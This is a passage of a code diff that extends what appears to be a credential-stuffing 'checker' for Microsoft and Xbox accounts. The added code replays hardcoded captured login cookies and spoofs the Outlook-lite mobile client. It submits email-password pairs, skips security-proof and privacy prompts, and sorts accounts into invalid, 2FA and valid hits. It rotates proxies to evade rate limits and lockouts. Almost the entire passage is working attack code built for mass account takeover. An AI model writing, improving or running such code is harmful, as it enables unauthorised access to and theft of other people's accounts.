OParams=11O.DoA1AdCWDhcFcLAmORZBM!x1dE4R8FY3ldMudB6QPkm5b5xK3dC6usjfpLK5Pglucp2wCGNZSpb2sghXSY9hdI4viu9TYH5!YArHTAOuOOIg5nRgepf8r9FE9d8Lp4T2vCg8Meaf8Hx8jJkqzeFGnI5stwf3T12suiGt7aAfh1GebK2yPsczRjdlU!ag7LWu7QQ!Y3ng1OQxiKGUtETT8J5hu1NHAqMPx*Qbl*kQ256M6LWe3kFQkZcdxk7ffcL5vw1faBTygkZk9RCBUeASqeXJ*9LN100J9m!ITVQOXBzdHZm5nHllLL8zk61DDWuQTZqHnnFpFXabnFxvxAnI6B5yrhS*loBDbvsWPXZRrF*z1EJci2oyrz8IQ15DrcwO9cHpeP*RMzQ1VyXySR2MadoTrD7dY0nruaLL0cVxWjpxPAsifi3YWeuvSfwyafxjYGEGwzM*FXT0ijrxI4HCCQFCYisuE4oXKB5f*GcklK2XL0xEh3M3U3oMKrKlPMQYqx*HkAE9sk2Xvm5PkOVJjr8mF3cZafRJsJH55g7HtCuNUefOvitPAZtH2EWWYCXVhnRlXZiZLnLw!eppm3Z1Uu3UlKqlicQoIWRErrjLRrqj6rxsOiM9Lc37GyxZ6*p!yHGqkJp8EPhudUpa!BXXDqPmBWTKsiW0WxJvq7y!lLIDrH7r99QpRaFz9ucmGpZMHkPSkh0X!DK7WGCv!hzMx!Laz9fykEXifJc0n1zgc3IdvWYCDQGTbNddoB4gPbOQivUcDc2rEh89e1TPkPI0z9!e3lhpjSMogjmMwzROsA80abMGKm!mEwS5FjzCwqJMUSaANMN!TxI5V2VaeiKcNhDlvyXPfhY!yAzcJMgcXNCTFEVIx6uSshhyGqJTnjG7hbH7w*MrepZHcr1JwK0nD2FVq4olvZVxsuVpkviKCdBl*wtXpuGolSSeLTWlK9Eg8rSI4t2OmTtLpVvUsYMNuY1mqc6wQBMSzKCDtbb5Q3Qv*zgd2vY4yh6fVneD*D4vPrDx*JBWraA*FFf7u4cC7tUgilRt!kKiyBUFm*EsPwWysCjnFxIqcfYdrXRO5L!QWRqSoTKGslJXqN0BLUfUV5P0PS*bWyAzPPchM1Nv07i5tTGtqFz8zyYf2NWq8bhxrOPOYzmtwtsCM7Y*CMbHrDE$; MSPOK=$uuid-a26bdf97-2619-4f16-ba61-6b189e1f6e0f"
+        ),
+    ),
+]
+_cfg_lock = threading.Lock()
+_cfg_toomany = [0] * len(_LOGIN_CONFIGS)
+_cfg_reset_at = [0.0] * len(_LOGIN_CONFIGS)
+
+def _record_toomany(idx: int):
+    now = time.time()
+    with _cfg_lock:
+        if now - _cfg_reset_at[idx] > 60:
+            _cfg_toomany[idx] = 0
+            _cfg_reset_at[idx] = now
+        _cfg_toomany[idx] += 1
+
+import urllib.parse
+import uuid
+
+def _get_outlook_tokens(email, session):
+    for _ in range(4):
+        try:
+            headers = {
+                "Connection": "keep-alive",
+                "Upgrade-Insecure-Requests": "1",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "return-client-request-id": "false",
+                "client-request-id": str(uuid.uuid4()),
+                "x-ms-sso-ignore-sso": "1",
+                "correlation-id": str(uuid.uuid4()),
+                "x-client-ver": "1.1.0+9e54a0d1",
+                "x-client-os": "28",
+                "x-client-sku": "MSAL.xplat.android",
+                "x-client-src-sku": "MSAL.xplat.android",
+                "X-Requested-With": "com.microsoft.outlooklite",
+            }
+
+            params = {
+                "client_info": "1",
+                "haschrome": "1",
+                "login_hint": email,
+                "mkt": "en",
+                "response_type": "code",
+                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
+                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
+                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
+            }
+
+            url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
+            res = session.get(url, headers=headers, timeout=12)
+            text = res.text
+
+            if '"urlPost":"' not in text:
+                continue
+
+            urlPost = text.split('"urlPost":"')[1].split('",')[0]
+
+            PPFT = None
+            for ppft_start, ppft_end in [
+                ('name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"'),
+                ('name="PPFT" id="i0327" value="', '"'),
+                ('"sFT":"', '"'),
+                ("sFTTag:'", "'"),
+            ]:
+                if ppft_start in text:
+                    try:
+                        candidate = text.split(ppft_start)[1].split(ppft_end)[0]
+                        if candidate and len(candidate) > 10:
+                            PPFT = candidate
+                            break
+                    except Exception:
+                        continue
+            if not PPFT:
+                continue
+
+            cok = res.cookies.get_dict()
+            return (
+                urlPost, PPFT,
+                res.url.split('haschrome=1')[0] if 'haschrome=1' in res.url else res.url,
+                cok.get('MSPRequ', ''), cok.get('uaid', ''),
+                cok.get('RefreshTokenSso', ''), cok.get('MSPOK', ''),
+                cok.get('OParams', '')
+            )
+        except Exception as e:
+            continue
+    return None
+
+def _ms_login(email, password, session, proxy):
+    """Primary login via bypass.txt Outlook-lite fresh PPFT approach."""
+
+    tokens = _get_outlook_tokens(email, session)
+    if tokens:
+        host, h1, h2, h3, h4, h6, h7, h8 = tokens
+        payload = {
+            "i13": "1", "login": email, "loginfmt": email, "type": "11",
+            "LoginOptions": "1", "lrt": "", "lrtPartition": "", "hisRegion": "",
+            "hisScaleUnit": "", "passwd": password, "ps": "2",
+            "psRNGCDefaultType": "", "psRNGCEntropy": "", "psRNGCSLK": "",
+            "canary": "", "ctx": "", "hpgrequestid": "", "PPFT": h1,
+            "PPSX": "PassportR", "NewUser": "1", "FoundMSAs": "",
+            "fspost": "0", "i21": "0", "CookieDisclosure": "0",
+            "IsFidoSupported": "0", "isSignupPost": "0",
+            "isRecoveryAttemptPost": "0", "i19": "9960"
+        }
+        login_headers = {
+            "Host": "login.live.com",
+            "Connection": "keep-alive",
+            "Content-Length": str(len(urllib.parse.urlencode(payload))),
+            "Cache-Control": "max-age=0",
+            "Upgrade-Insecure-Requests": "1",
+            "Origin": "https://login.live.com",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-User": "?1",
+            "Sec-Fetch-Dest": "document",
+            "Referer": f"{h2}haschrome=1" if h2 else "https://login.live.com/",
+            "Accept-Encoding": "gzip, deflate",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Cookie": f"MSPRequ={h3};uaid={h4};RefreshTokenSso={h6};MSPOK={h7};OParams={h8}"
+        }
+        try:
+            r = session.post(host, data=payload, headers=login_headers, allow_redirects=True, timeout=12)
+            body_lower = r.text.lower()
+
+
+            if any(k in body_lower for k in [
+                "password is incorrect", "that microsoft account doesn't exist",
+                "account doesn't exist", "no account found",
+                "invalid username or password", "we couldn't find an account",
+            ]):
+                return "None"
+
+
+            if any(k in body_lower for k in [
+                "two-step", "two factor", "verification code",
+                "authenticator", "sign-in was blocked", "account is locked",
+                "enter a code", "verify your identity",
+            ]):
+                return "2FA"
+
+
+            if "account.live.com/proofs" in r.text or "account.live.com/proofs" in r.url:
+                try:
+                    ipt   = r.text.split('id="ipt" value="')[1].split('"')[0]
+                    pprid = r.text.split('id="pprid" value="')[1].split('"')[0]
+                    uaid  = r.text.split('id="uaid" value="')[1].split('"')[0]
+                    fmhf  = r.text.split('id="fmHF" action="')[1].split('"')[0]
+                    r2 = session.post(
+                        fmhf,
+                        data=f"ipt={ipt}&pprid={pprid}&uaid={uaid}",
+                        headers={"Content-Type": "application/x-www-form-urlencoded"},
+                        timeout=15, allow_redirects=True,
+                    )
+                    try:
+                        canary = r2.text.split('id="canary" name="canary" value="')[1].split('"')[0] if 'id="canary"' in r2.text else ""
+                        action = r2.text.split('id="frmAddProof" method="post" action="')[1].split('"')[0]
+                        session.post(
+                            action,
+                            data={"iProofOptions": "Email", "DisplayPhoneCountryISO": "US",
+                                  "DisplayPhoneNumber": "", "EmailAddress": "",
+                                  "canary": canary, "action": "Skip",
+                                  "PhoneNumber": "", "PhoneCountryISO": ""},
+                            headers={"Content-Type": "application/x-www-form-urlencoded"},
+                            timeout=15, allow_redirects=True,
+                        )
+                    except Exception:
+                        pass
+                except Exception:
+                    pass
+
+
+
+            if "privacynotice.account.microsoft.com" in r.text or "privacynotice.account.microsoft.com" in r.url:
+                try:
+                    priv_url = r.text.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]
+                    corr_id  = r.text.split('name="correlation_id" id="correlation_id" value="')[1].split('"')[0]
+                    code_v   = r.text.split('type="hidden" name="code" id="code" value="')[1].split('"')[0]
+                    client   = r.text.split('type="hidden" name="client_info" id="client_info" value="')[1].split('"')[0]
+                    session.post(
+                        priv_url,
+                        data={"correlation_id": corr_id, "code": code_v,
+                              "client_info": client, "action": "accept"},
+                        headers={"Content-Type": "application/x-www-form-urlencoded"},
+                        timeout=15, allow_redirects=True,
+                    )
+                except Exception:
+                    pass
+
+
+            rps_result = get_urlPost_sFTTag(session)
+            if rps_result and rps_result[0] != "ERROR" and rps_result[1]:
+                rps_url, rps_sft, auth_session = rps_result
+                rps_token_result = get_xbox_rps(auth_session, email, password, rps_url, rps_sft)
+                if rps_token_result:
+                    rps_tok, _ = rps_token_result
+                    if rps_tok and rps_tok not in ("None", "2FA", "ERROR"):
+                        return rps_tok
+                    elif rps_tok == "2FA":
+                        return "2FA"
+                    elif rps_tok == "None":
+                        return "None"
+
+
+            try:
+                r2 = session.get(
+                    "https://login.live.com/oauth20_authorize.srf"
+                    "?client_id=00000000402B5328&response_type=token"
+                    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
+                    "&redirect_uri=https://login.live.com/oauth20_desktop.srf",
+                    allow_redirects=True, timeout=12
+                )
+                frag = urllib.parse.urlparse(r2.url).fragment
+                tok = urllib.parse.parse_qs(frag).get("access_token", [None])[0]
+                if tok and tok != "None":
+                    return tok
+
+            except Exception:
+                pass
+
+        except Exception:
+            pass
+
+
+    try:
+        rps_result = get_urlPost_sFTTag(session)
+        if rps_result and rps_result[0] != "ERROR" and rps_result[1]:
+            rps_url, rps_sft, auth_session = rps_result
+            rps_token_result = get_xbox_rps(auth_session, email, password, rps_url, rps_sft)
+            if rps_token_result:
+                rps_tok, _ = rps_token_result
+                if rps_tok and rps_tok not in ("None", "2FA", "ERROR"):
+                    return rps_tok
+                elif rps_tok == "2FA":
+                    return "2FA"
+                elif rps_tok == "None":
+                    return "None"
+    except Exception:
+        pass
+
+
+    cfg_order = sorted(range(len(_LOGIN_CONFIGS)), key=lambda i: _cfg_toomany[i])
+    for cfg_idx in cfg_order:
+        cfg = _LOGIN_CONFIGS[cfg_idx]
+        toomany_hits = 0
+        attempts = 0
+        while attempts < 3:
+            attempts += 1
+            try:
+                r = session.post(
+                    cfg["url"].replace("%7bemail%7d", urllib.parse.quote(email)),
+                    data={
+                        "login": email,
+                        "loginfmt": email,
+                        "passwd": password,
+                        "PPFT": cfg["ppft"],
+                    },
+                    headers={
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Cookie": cfg["cookie"],
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
+                    },
+                    timeout=15,
+                    allow_redirects=False,
+                )
+            except Exception:
+                break
+
+            code = r.status_code
+            if code == 429:
+                time.sleep(1.5)
+                continue
+            if code >= 500:
+                time.sleep(1)
+                continue
+
+            loc = r.headers.get("Location", "")
+            if "access_token=" in loc:
+                try:
+                    token = urllib.parse.unquote(loc.split("access_token=")[1].split("&")[0])
+                    if token and token != "None":
+                        return token
+                except Exception:
+                    pass
+            elif "t=" in loc:
+                try:
+                    token = urllib.parse.unquote(loc.split("t=")[1].split("&")[0])
+                    if token and token != "None":
+                        return token
+                except Exception:
+                    pass
+
+            try:
+                body = r.text.lower()
+            except Exception:
+                body = ""
+
+            if "you have tried too many times" in body or "tried too many" in body or "too many incorrect password" in body:
+                _record_toomany(cfg_idx)
+                toomany_hits += 1
+                if toomany_hits >= 2:
+                    break
+                session.proxies = getproxy()
+                time.sleep(1.5)
+                continue
+
+            if any(k in body for k in [
+                "password is incorrect",
+                "that microsoft account doesn't exist",
+                "account doesn't exist",
+                "no account found",
+                "we couldn't find an account",
+                "invalid username or password",
+            ]):
+                return "None"
+
+            if any(k in body for k in [
+                "two-step", "two factor", "verification code",
+                "authenticator", "suggestedaction",
+                "sign-in was blocked", "account is locked",
+                "suspended", "unusual activity",
+            ]):
+                return "2FA"
+
+            break
+
+    return "ERROR"
+
 def authenticate(email, password, use_optimized=True):
     global retries, bad, checked, cpm, twofa
     current_try = 0
@@ -2723,6 +3278,7 @@ def authenticate(email, password, use_optimized=True):
         try:
             session = create_optimized_session()
             session.cookies.clear()
+            proxy_config = None
             if proxytype != "'4'":
                 try:
                     proxy_config = getproxy()
@@ -2730,17 +3286,14 @@ def authenticate(email, password, use_optimized=True):
                         session.proxies = proxy_config
                 except Exception:
                     pass
-            urlPost, sFTTag, session = get_urlPost_sFTTag(session)
-            if urlPost == 'ERROR' or urlPost is None or sFTTag is None:
-                current_try += 1
-                time.sleep(0.5 if not is_no_proxy() else 1)
-                continue
-            token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
+            
+            token = _ms_login(email, password, session, proxy_config)
+            
             if token == 'ERROR':
-
                 current_try += 1
                 try: session.close()
                 except: pass
+                time.sleep(1)
                 continue
             if token == '2FA':
                 with stats_lock:
@@ -2756,6 +3309,7 @@ def authenticate(email, password, use_optimized=True):
                 try: session.close()
                 except: pass
                 return False
+                
             if token != 'None' and token != '2FA':
                 hit = False
                 try:
@@ -2779,6 +3333,10 @@ def authenticate(email, password, use_optimized=True):
                 try: session.close()
                 except: pass
                 if not hit:
+                    if 'xbox_login' in locals() and xbox_login.status_code in [400, 401]:
+                        current_try += 1
+                        time.sleep(1)
+                        continue
                     validmail(email, password)
                     return 'VALID_MAIL'
                 else:
